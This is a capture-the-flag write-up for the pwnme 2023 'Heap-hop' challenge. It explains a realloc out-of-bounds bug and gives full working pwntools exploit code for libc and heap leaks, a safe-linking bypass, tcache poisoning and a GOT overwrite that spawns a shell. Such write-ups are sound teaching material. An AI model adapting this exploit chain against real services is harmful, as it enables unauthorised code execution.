---
title: "[pwnme 2023] Heap-hop"
date: 2023-05-07
tags: ["ctf", "nasm", "pwn", "linux", "pwnme", "heap", "tcache"]
---

## Heap-Hop

> Solves: 31  Medium
>
>Heap exploitation is cool, and the best is when no free is used. >Try to pwn the challenge and get the flag remotely.
>
>**Note**:
>- *You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT*
>
>Author: Express#8049
>
>Remote service at : nc 51.254.39.184 1336

Heap-hop is a heap exploitation challenge I did during the [pwnme CTF](https://pwnme.fr/). It involved classic tricks like tcache poisoning and GOT hiijacking. You can find the related files [here](https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/heap).

### TL;DR

- Setup heap layout
- fill tcachebin for 0x400 sized chunks
- free large 0x400 sized chunk to get libc addresses
- oob read onto the chunk right before the large freed chunk => libc leak
- request a small 0x20 sized chunk that gets free right after, it falls at the begin of the chunk in the unsortedbin, oob read like just before => heap leak.
- tcache poisoning (we're able to deal with safe-linking given we leaked heap)
- With the help of tcache poisoning, overwrite `realloc@got` to write `&system`
- `realloc("/bin/sh")` is then `system("/binb/sh")`

## What we have

```
$ checksec --file ./heap-hop
[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

What we can see is that a recent libc is provided (which means with safe-linking) and that the binary isn't PIE.

## Code review

Here is basically the main logic of the binary:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int input_int; // [rsp+Ch] [rbp-4h]

  puts("[+] Welcome to hip-hop, you can create and listen to heap-hop music");
  do
  {
    printf("%s", "Make your choice :\n\t- 1. Create a track.\n\t- 2. Read a track.\n\t- 3. Edit a track.\n> ");
    input_int = read_input_int();
    if ( input_int == 3 )
    {
      handle_edit();
    }
    else
    {
      if ( input_int > 3 )
        goto LABEL_10;
      if ( input_int == 1 )
      {
        handle_create();
        continue;
      }
      if ( input_int == 2 )
        handle_read();
      else
LABEL_10:
        quit = 1;
    }
  }
  while ( quit != 1 );
  return puts("[?] Goodbye.");
}
```

Basic layout for a heap exploitation challenge, we're allowed to create, read and edit a given track. As we already read in the initial statement we apparently cannot free a track.

Let's first take a look at the create function:
```c
unsigned __int64 handle_create()
{
  void *v0; // rdx
  unsigned int idx; // [rsp+Ch] [rbp-14h] BYREF
  chunk_t *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  idx = 0;
  printf("Enter the tracklist ID\n> ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 0x100 )
    _exit(1);
  if ( tracks[idx] )
  {
    puts("[!] track already exists.\n");
  }
  else
  {
    buf = (chunk_t *)malloc(0x30uLL);
    if ( !buf )
      _exit(1);
    printf("Enter the tracklist name\n> ");
    read(0, buf, 0x20uLL);
    printf("Enter the tracklist content length\n> ");
    __isoc99_scanf("%ld", &buf->size);
    if ( buf->size > 0x480uLL )
      _exit(1);
    v0 = malloc(buf->size);
    buf->track = (__int64)v0;
    if ( !buf->track )
      _exit(1);
    printf("Enter the tracklist content\n> ");
    if ( !read(0, (void *)buf->track, buf->size) )
      _exit(1);
    tracks[idx] = buf;
    puts("[+] track successfully created.\n");
  }
  return v4 - __readfsqword(0x28u);
}
```

It crafts a chunk, and then allocates a chunk for a given size (< 0x480). The read function is very basic:
```c
unsigned __int64 handle_read()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf("Enter the tracklist ID\n> ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0x100 )
    _exit(1);
  if ( tracks[v1] )
  {
    puts("[+] track content :");
    write(1, (const void *)tracks[v1]->track, tracks[v1]->size);
    puts(&byte_4020FF);
  }
  else
  {
    puts("[!] track doesn't exist.\n");
  }
  return v2 - __readfsqword(0x28u);
}
```
It prints `tracks[v1]->size` bytes from `tracks[v1]->track`. Which means no need to worry about badchars for the leak.

The bug lies in the `handle_edit` function:
```c
unsigned __int64 handle_edit()
{
  chunk_t *v0; // rbx
  unsigned int idx; // [rsp+Ch] [rbp-24h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  idx = 0;
  size = 0LL;
  printf("Enter the tracklist ID\n> ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 0x100 )
    _exit(1);
  if ( tracks[idx] )
  {
    printf("Enter the new tracklist content length\n> ");
    __isoc99_scanf("%ld", &size);
    if ( size > 0x480 )
      _exit(1);
    v0 = tracks[idx];
    v0->track = (__int64)realloc((void *)v0->track, size);
    printf("Enter the new tracklist content\n> ");
    read(0, (void *)tracks[idx]->track, tracks[idx]->size);
    puts("[+] track content edited.");
  }
  else
  {
    puts("[!] track doesn't exist.\n");
  }
  return v4 - __readfsqword(0x28u);
}
```

There are two bugs, or at least interesting behaviours around realloc. First there is an out of bound (oob) read / write, indeed if we give a size smaller than `tracks[idx]->size`, then `v0->track` could be changed to a smaller chunk and thus `read(0, (void *)tracks[idx]->track, tracks[idx]->size);` could write over the end of the chunk. Secondly we can free a chunk by giving zero to the size.

## Exploitation

Given tcache poisoning seems to be pretty easy to achieve, we need to find were use our arbitrary write. If you remind well, the binary isn't PIE and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call `realloc("/bin/sh")`. This way we need to get a heap and a libc leak.

### libc leak

To get a libc leak we can fill the tcache and free a large chunk to make appear libc addresses on the heap and then read it through the oob read. Which gives:
```py
create(0, b"", 5, b"0")

# Step one, 7 chunks to fill tcache later
for i in range(7):
    create(1+i, b"", 0x400, str(i).encode())

# small chunk which will be used to the oob r/w
create(8+1, b"", 0x20, b"_")
# victim chunk
create(9+1, b"", 0x400, b"_")

# chunk with big size that will be used for the oob r/w
create(10+1, b"", 0x200, b"barreer")
create(10+2, b"", 0x20, b"barree2")

# fill tcache
for i in range(7):
    free(1+i)

# oob chunk 
free(8+1)

free(11) # we free in order that at the next edit it actually allocates a new chunk
edit(11, 0x20, b"_") # allocated in 9

free(9+1) # falls in the unsortedbin

read(11) # oob read
io.recv(0x70)
libc.address = pwn.unpack(io.recv(8)) - 0x219ce0
```

The heap looks like this:
```
0x1d83120       0x0000000000000000      0x0000000000000041      ........A.......        <= chunk used to get the oob r/w
0x1d83130       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83140       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83150       0x0000000000000020      0x0000000000000000       ...............
0x1d83160       0x0000000000000000      0x0000000000000031      ........1.......        <= track buffer of the chunk used to get the oob r/w
0x1d83170       0x0000000000000a5f      0x0000000000000000      _...............                                                                               
0x1d83180       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83190       0x0000000000000000      0x0000000000000041      ........A.......        <= victim chunk, size: 0x400, its track field is fell into the unsortedbin
0x1d831a0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d831b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d831c0       0x0000000000000400      0x0000000000000000      ................                                                                               
0x1d831d0       0x0000000000000000      0x0000000000000411      ................        <-- unsortedbin[all][0]                                                
0x1d831e0       0x00007f0eb218dce0      0x00007f0eb218dce0      ................                                                                               
0x1d831f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83200       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83210       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83220       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83230       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83240       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83250       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83260       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83270       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83280       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83290       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83300       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83310       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83320       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83330       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83340       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83350       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83360       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83370       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83380       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83390       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833d0       0x0000000000000000      0x0000000000000000      ................
0x1d833e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83400       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83410       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83420       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83430       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83440       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83450       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83460       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83470       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83480       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83490       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83500       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83510       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83520       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83530       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83540       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83550       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83560       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83570       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83580       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83590       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835e0       0x0000000000000410      0x0000000000000040      ........@.......        <= Freed chunk 11
0x1d835f0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83600       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83610       0x0000000000000200      0x0000000001d83170      ........p1......                                                                               
0x1d83620       0x0000000000000000      0x0000000000000211      ................                                                                               
0x1d83630       0x0000000000001d83      0x5b5e1382ca86a7f8      ..............^[        <-- tcachebins[0x210][0/1]                                             
0x1d83640       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83650       0x0000000000000000      0x0000000000000000      ................                             
0x1d83660       0x0000000000000000      0x0000000000000000      ................                             
0x1d83670       0x0000000000000000      0x0000000000000000      ................                             
0x1d83680       0x0000000000000000      0x0000000000000000      ................                             
0x1d83690       0x0000000000000000      0x0000000000000000      ................                             
0x1d836a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83700       0x0000000000000000      0x0000000000000000      ................                             
0x1d83710       0x0000000000000000      0x0000000000000000      ................                             
0x1d83720       0x0000000000000000      0x0000000000000000      ................                             
0x1d83730       0x0000000000000000      0x0000000000000000      ................                             
0x1d83740       0x0000000000000000      0x0000000000000000      ................                             
0x1d83750       0x0000000000000000      0x0000000000000000      ................                             
0x1d83760       0x0000000000000000      0x0000000000000000      ................                             
0x1d83770       0x0000000000000000      0x0000000000000000      ................                             
0x1d83780       0x0000000000000000      0x0000000000000000      ................                             
0x1d83790       0x0000000000000000      0x0000000000000000      ................                             
0x1d837a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83800       0x0000000000000000      0x0000000000000000      ................                             
0x1d83810       0x0000000000000000      0x0000000000000000      ................                             
0x1d83820       0x0000000000000000      0x0000000000000000      ................                             
0x1d83830       0x0000000000000000      0x0000000000000041      ........A.......        <= last small chunk, barreer               
0x1d83840       0x000000000000000a      0x0000000000000000      ................                             
0x1d83850       0x0000000000000000      0x0000000000000000      ................                             
0x1d83860       0x0000000000000020      0x0000000001d83880       ........8......                             
0x1d83870       0x0000000000000000      0x0000000000000031      ........1.......                             
0x1d83880       0x00000000000a3233      0x0000000000000000      32..............                             
0x1d83890       0x0000000000000000      0x0000000000000000      ................                             
0x1d838a0       0x0000000000000000      0x000000000001e761      ........a.......        <-- Top chunk        
```

I advice you to take a look at the heap layout if you do not understand the exploit script.

### Heap leak

Now we got a libc leak we're looking for a heap leak, it is basically the same thing as above, but instead of freeing a large chunk, we free a small `0x20` sized chunk. To understand the defeat of safe-linking I advice you to read [this](https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation). Which gives:
```py
# leak heap to craft pointers
edit(1, 0x10, b"osef") # split unsortedbin chunk
free(1) # tcache 0x20

read(11) # oob read
io.recv(0x70)
heap = (pwn.unpack(io.recv(8)) << 12) - 0x2000 # leak fp of 1
pwn.log.info(f"heap: {hex(heap)}")
```

## tcache poisoning

To achieve tcache poisoning we just need to get the `0x20` sized chunk right after the out of bound chunk. Then we free it and we use the out of bound chunk to overwrite the forward pointer of the victim chunk to `&realloc@GOT`. Given we leaked the heap we can easily bypass the safe-linking protection.
```py
#== tcache poisoning

# get the 0x20 sized chunk that is right after the oob chunk
edit(10, 10, b"osef")

free(0)

# tcache 0x20, count = 2, tcache poisoning is basically 10->fp = target
free(10) 

# oob write to set 10->fp = &realloc@got-8 (due to alignment issues)
edit(11, 0x20, b"Y" * 0x60 + pwn.p64(0) + pwn.p64(0x31) + pwn.p64(((heap + 0x21f0) >> 12) ^ (exe.got.realloc - 8))) 

edit(3, 10, pwn.p64(libc.address + one_gadget("./libc.so.6")[0])) # useless
edit(12, 10, b"/bin/sh\0") # 12 => b"/binb/sh\0"

# given we falls on &realloc@got-8, we overwrite got entries correctly 
edit(4, 10, pwn.p64(libc.sym.malloc) + pwn.p64(libc.sym.system) + pwn.p64(libc.sym.scanf))
```

## PROFIT

Then we just have to do:
```py
# edit => realloc("/bin/sh") => system("/bin/sh")
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"> ", str(12).encode())
io.sendlineafter(b"> ", str(10).encode())

io.interactive()
```

Which gives:
```
nasm@off:~/Documents/pwn/pwnme/heap$ python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1336
[*] '/home/nasm/Documents/pwn/pwnme/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
[*] '/home/nasm/Documents/pwn/pwnme/heap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 51.254.39.184 on port 1336: Done
[*] libc: 0x7faf9a27f000
[*] heap: 0x191d000
[*] one_gadget: 0x7faf9a36acf8 @ 0x404050
[*] Switching to interactive mode
$ id
uid=1000(player) gid=999(ctf) groups=999(ctf)
$ ls
flag.txt
run
$ cat flag.txt
PWNME{d1d_y0u_kn0w_r341l0c_c4n_b3h4v3_l1k3_th4t}
```

## Final exploit

Here is the final exploit:
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "heap-hop"
LIBC = "/home/nasm/Documents/pwn/pwnme/heap/libc.so.6"
LD = "/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

import subprocess
def one_gadget(filename):
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

gdbscript = '''
source ~/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

def exp():

    io = start()

    def create(idx, name, trackLen, trackContent):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", str(idx).encode())
        io.sendlineafter(b"> ", name)
        io.sendlineafter(b"> ", str(trackLen).encode())
        io.sendlineafter(b"> ", str(trackLen).encode())

    def read(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", str(idx).encode())
        io.recvuntil(b"[+] track content :\n")

    def edit(idx, newLength, trackContent):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", str(idx).encode())
        io.sendlineafter(b"> ", str(newLength).encode())
        io.sendlineafter(b"> ", trackContent)

    def free(idx):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", str(idx).encode())
        io.sendlineafter(b"> ", str(0).encode())
        io.sendlineafter(b"> ", b"")

    create(0, b"", 5, b"0")
    
    # Step one, 7 chunks to fill tcache later
    for i in range(7):
        create(1+i, b"", 0x400, str(i).encode())

    # small chunk which will be used to the oob r/w
    create(8+1, b"", 0x20, b"_")
    # victim chunk
    create(9+1, b"", 0x400, b"_")

    # chunk with big size that will be used for the oob r/w
    create(10+1, b"", 0x200, b"barreer")
    create(10+2, b"", 0x20, b"barree2")

    # fill tcache
    for i in range(7):
        free(1+i)

    # oob chunk 
    free(8+1)
    
    free(11)
    edit(11, 0x20, b"_") # allocated in 9
    
    free(9+1) # falls in the unsortedbin

    read(11) # oob read
    io.recv(0x70)
    libc.address = pwn.unpack(io.recv(8)) - 0x219ce0
    pwn.log.info(f"libc: {hex(libc.address)}") # leak libc

    # leak heap to craft pointers
    edit(1, 0x10, b"osef") # split unsortedbin chunk
    free(1) # tcache 0x20

    read(11) # oob read
    io.recv(0x70)
    heap = (pwn.unpack(io.recv(8)) << 12) - 0x2000
    pwn.log.info(f"heap: {hex(heap)}")

    #== tcache poisoning
 
    # get the 0x20 sized chunk that is right after the oob chunk
    edit(10, 10, b"osef")

    free(0)

    # tcache 0x20, count = 2, tcache poisoning is basically 10->fp = target
    free(10) 

    # oob write to set 10->fp = &realloc@got-8 (due to alignment issues)
    edit(11, 0x20, b"Y" * 0x60 + pwn.p64(0) + pwn.p64(0x31) + pwn.p64(((heap + 0x21f0) >> 12) ^ (exe.got.realloc - 8))) 

    edit(3, 10, pwn.p64(libc.address + one_gadget("./libc.so.6")[0])) # useless
    edit(12, 10, b"/bin/sh\0") # 12 => b"/binb/sh\0"

    # given we falls on &realloc@got-8, we overwrite got entries correctly 
    edit(4, 10, pwn.p64(libc.sym.malloc) + pwn.p64(libc.sym.system) + pwn.p64(libc.sym.scanf))


    # edit => realloc("/bin/sh") => system("/bin/sh")
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(12).encode())
    io.sendlineafter(b"> ", str(10).encode())

    io.interactive()

if __name__ == "__main__":
    exp()
```